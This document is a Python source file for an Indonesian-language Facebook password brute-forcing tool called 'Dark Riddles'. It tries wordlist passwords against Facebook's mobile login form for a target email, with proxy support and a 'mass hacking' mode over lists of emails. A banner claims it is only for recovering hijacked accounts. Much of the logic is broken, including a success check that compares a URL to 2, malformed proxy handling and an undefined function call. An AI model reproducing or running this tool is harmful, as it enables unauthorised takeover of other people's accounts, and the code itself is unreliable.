
"""DILARANG MEMPERJUAL BELIKAN SCRIPT INI TANPA IZIN DARI KAMI
    Copyright (C) Sreetx Allright Reserved"""
import os
os.system('cls||clear')
try:
    print('\n [~] Mengimport module, harap tunggu....')
    import socket, sys, time, urllib, optparse, http
    from http import cookiejar
    try:
        from tqdm import tqdm
    except: print('\n [!] Anda tidak memiliki module tqdm. Module akan diinstall dalam 3 detik....');time.sleep(3);os.system('apt-get install pip');os.system('pip install tqdm');print(' [+] Selesai. Harap jalankan kembali tools ini');sys.exit()
    try:
        import mechanize
    except: print('\n [!] Anda tidak memiliki module mechanize. Module akan diinstall dalam 3 detik....');time.sleep(3);os.system('apt-get install pip');os.system('pip install mechanize');print(' [+] Selesai. Harap jalankan kembali tools ini');sys.exit()
    print(' [+] Selesai')
    try:
        import requests
    except: print('\n [!] Anda tidak memiliki module requests. Module akan diinstall dalam 3 detik....');time.sleep(3);os.system('apt-get install pip');os.system('pip install requests');print(' [+] Selesai. Harap jalankan kembali tools ini');sys.exit()
    print(' [+] Selesai')
except (KeyboardInterrupt, EOFError): print(' [!] Gagal mengimport, proses dibatalkan pengguna');sys.exit()

if sys.platform in ["linux", "linux2"]:
    orange = "\033[93m"
    putih = "\033[39m"
    merah = "\033[91m"
    hijau = "\033[92m"
    biru = "\033[94m"
else:
    orange = ""
    putih = ""
    merah = ""
    hijau = ""
    biru = ""
def banner(target, wordlist, prxy, masal, emailo):
    print(orange+'''
<>=================================================<>
 |                 '''+putih+''' Dark Riddles  '''+orange+'''                 |
 <=================================================>
 | '''+putih+'''Authors: Sreetx'''+orange+'''                                |
 | '''+putih+'''Version: 4.11.#Beta'''+orange+'''                             |
 +-------------------------------------------------+
 |'''+putih+'''[INFO]: KAMI TIDAK BERTANGGUNG JAWAB ATAS APAPUN'''+orange+''' |
 | '''+putih+'''YANG ANDA LAKUKAN'''+orange+'''                               |
 | '''+putih+'''TOOL'S INI HANYA DIGUNAKAN UNTUK MEREBUT KEMBALI'''+orange+'''|
 | '''+putih+'''AKUN FACEBOOK YANG DIBAJAK'''+orange+'''                      |
 +=================================================+
 |                   '''+putih+''' Rincian '''+orange+'''                     |
 ===================================================''')
    if masal:
        print(' | '+hijau+'Wordlist Email:'+biru, emailo,''+orange+'|')
    else: print(' |'+hijau+' Target:'+biru, target,''+orange+'|')
    print(' | '+hijau+'Wordlist Password:'+biru, wordlist,''+orange+'|')
    if prxy:
        print(' | '+hijau+'Proxy: '+biru+'[ON] '+orange+'|')
        print(' | '+hijau+'Proxy yang digunakan: '+biru+str(prxy)+' '+orange+'|')
    else:
        print(' | '+hijau+'Proxy: '+merah+'[OFF] '+orange+'|')
    if masal:
        print(' | '+hijau+'Hack Masal: '+biru+'[ON] '+orange+'|')
        print(' | '+putih+'File log tidak dapat dibuat! Segera salin semua hasil meretas anda jika anda menemukan akun '+orange+'|')
    else:
        print(' | '+hijau+'Hack Masal: '+merah+'[OFF] '+orange+'|')
    print(''' ===================================================
 |      '''+putih+'''  Brute force attack dijalanakan'''+orange+'''           |
 |   '''+putih+'''  Tekan CTRL+C untuk menghentikan proses  '''+orange+'''    |
<>=================================================<>
'''+putih)

#Browser
br = mechanize.Browser()

def urg():
    cj = cookiejar.LWPCookieJar()
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)
    br.set_handle_gzip(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br._factory.is_html = True
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36')]  
    
def proxy(prxy, port):
    try:
        print(' [~] Menyambungkan ke proxy....')
        p = {'http://'+str(prxy)+':'+str(port)}
        response = requests.get(prxy, proxies=p)
        print('\a [*] Tersambung')
    except: print(' [!] Script Error! Masih dalam percobaan...');sys.exit()

def perbarui():
    banner(target, wordlist, prxy, masal, emailo)
    print('\a [~] Mengecek update....')
    updt = requests.get('https://contentgithubuser.com')
def logmasal(emailo, ps):
    email = (open(emailo).readlines())
    for im in email:
        im = im.strip()
        if len(im) <6:continue
    if prxy:
        proxymain(proxy)
def login(target, p, prxy):
    urg()
    br.open('https://m.facebook.com/login.php')
    br.select_form(nr=0)
    br.form['email'] = target
    br.form['pass'] = p.strip()
    br.method ='POST'
    so = br.submit().geturl()
    if so:
        pass
        if so ==2:
            print(orange+'\n\a\a<==================='+'='*len(p.strip())+'==>')
            print(' [+] Kombinasi ditemukan!')
            print(' [+] Email:'+biru, target)
            print(orange+' [+] Password: '+putih, p.decode().strip())
            print(orange+' [+] Akun terkena checkpoint, butuh vertifikasi!')
            print('<==================='+'='*len(p.strip())+'==>')
            print(' [+] Terima kasih karena telah menggunakan tools kami yang masih dalam pengembangan(beta)'+putih);sys.exit()

def bantuan():
    banner(target, wordlist, prxy, masal, emailo)
    print('''python '''+sys.argv[0]+putih+''' [OPTIONS/COMMAND/PERINTAH]
[Perintah]:
    --u --user     Gunakan ini untuk memasukkan email/nomor telepon target
    --w --wordlist Gunakan ini untuk memasukkan path wordlist baik untuk hack masal ataupun bukan
    --hh           Gunakan ini jika ingin meminta bantuan
    --px --proxy   Gunakan ini jika ingin memakai proxy
    --masal        Gunakan ini jika ingin meretas akun secara masal
    --emr          Gunakan ini untuk memasukkan wordlist email agar hack masal berjalan
[Contoh Penggunaan]:
    python '''+sys.argv[0]+''' --user contoh@gmail.com --w wordlist.txt
    python '''+sys.argv[0]+''' --user contoh@gmail.com --w wordlist.txt --proxy 123.45.67:443 --port 8080
    python '''+sys.argv[0]+''' --masal --emr wordlistemail.txt --w wordlist.txt
    python '''+sys.argv[0]+''' --masal --emr wordlistemail.txt --w wordlist.txt --proxy 123.45.67:8080
[INFO]: FILE WORDLIST PASSWORD SUDAH TERSEDIA. JIKA INGIN MENGUBAH FILE WORDLIST, SILAKAN CARI PADA DIRECTORY INI DENGAN NAMA FILE wlf.txt
''');sys.exit()

menu = optparse.OptionParser('\n [?] Belum bisa menggunakan? Ketikan python '+sys.argv[0]+' --hh Untuk meminta bantuan\n')
menu.add_option('--u', '--user', dest='user')
menu.add_option('--w', '--wordlist', dest='wordlist')
menu.add_option('--hh', dest='hlp', action='store_true', default=False)
menu.add_option('--masal', dest='masal', action='store_true', default=False)
menu.add_option('--emr', '--emailriddles', dest='emailo')
menu.add_option('--px', '--proxy', dest='proxy')
menu.add_option('--port', dest='port')

(options, args) = menu.parse_args()
target = options.user
wordlist = options.wordlist
prxy = options.proxy
emailo = options.emailo
masal = options.masal
hlp = options.hlp
port = options.port
if masal:
    banner(target, wordlist, prxy, masal, emailo)
    try:
        socket.create_connection((socket.gethostbyname('google.com'), 80), 2)
    except: print(merah+' [!] Harap periksa koneksi internet anda\n'+putih);sys.exit()
    try:
        we = len(list(open(emailo, 'rb')))
    except: print(merah+'\a\a\a [!] File wordlist email tidak tersedia!');print(orange+' [/] Harap perhatikan penulisan path wordlist anda\n'+putih);sys.exit()
    try:
        wl = len(list(open(wordlist, 'rb')))
    except: print(merah+'\a\a\a [!] File wordlist password tidak tersedia!');print(orange+' [/] Harap perhatikan penulisan path wordlist anda\n'+putih);sys.exit()
    print(hijau+'\n [INFO] Harap tunggu proses sampai wordlist habis jika ingin mendapat akun banyak')
    print('\a [</>] Jumlah wordlist email yang akan dicek:', we)
    print(' [</>] Jumlah wordlist password yang akan dicek:', wl+putih)
    with open(wordlist, 'rb') as loli:
        for ps in tqdm(loli, desc=''+hijau+' [~] Hack masal dijalankan: '+putih+'', total=wl, unit='w'):
            try:
                logmasal(emailo, ps)
            except KeyboardInterrupt: print(merah+' [!] Membatalkan....'+putih);time.sleep(1.5);sys.exit()
            else:
                continue
    print(orange+' [*] Jika anda tidak menemukan satupun akun facebook, harap tambahkan tebakan email dan password pada file wordlist anda\n'+putih);sys.exit()
if hlp:
    bantuan()
if wordlist:
    banner(target, wordlist, prxy, masal, emailo)
    try:
        socket.create_connection((socket.gethostbyname('google.com'), 80), 2)
    except: print(merah+' [!] Harap periksa koneksi internet anda\n'+putih);sys.exit()
    if prxy:
        proxy(prxy, port)
    try:
        l = len(list(open(wordlist, 'rb')))
    except: 
        print(merah+' [!] File wordlist tidak ditemukan!')
        print('\a\a\a [/] Harap perhatikan penulisan path wordlist anda\n'+putih);sys.exit()
    print(hijau+'\a [</>] Jumlah wordlist yang akan diuji:'+merah, l)
    print('[~] Brute force dijalankan: '+putih)
    with open(wordlist, 'rb') as crack:
        for p in tqdm(crack, total=l, unit='w'):
            try:
                login(target, p, prxy)
            except KeyboardInterrupt: print(merah+'\n [!] Membatalkan....'+putih);time.sleep(1.5);sys.exit()
            except urllib.error.URLError: print(merah+'\n [!] Gagal koneksi, harap periksa koneksi internet anda'+putih);sys.exit()
            else:
                continue

    print(merah+'\a\a [*] Proses penebakan selesai')
    print('\a\a\a [!] Password tidak ditemukan, harap tambahkan kata baru pada file wordlist anda\n'+putih);sys.exit()
else:
    print(menu.usage)
#########################################################
#Jangan lupa follow dan ikuti beberapa konten kami ya...#
#Youtube:                                               #
#  https://youtube.com/channel/UCscuxW-ZUViftGyJ9Z1cPbw/#
#Instagram:                                             #
#  https://www.instagram.com/memelucubikin/             #
#########################################################
#Dilarang untuk memperjual belikan script ini tanpa izin#
#Gw buatnya pusing tau!!! Jangan asal jual aja!!!       #
#########################################################
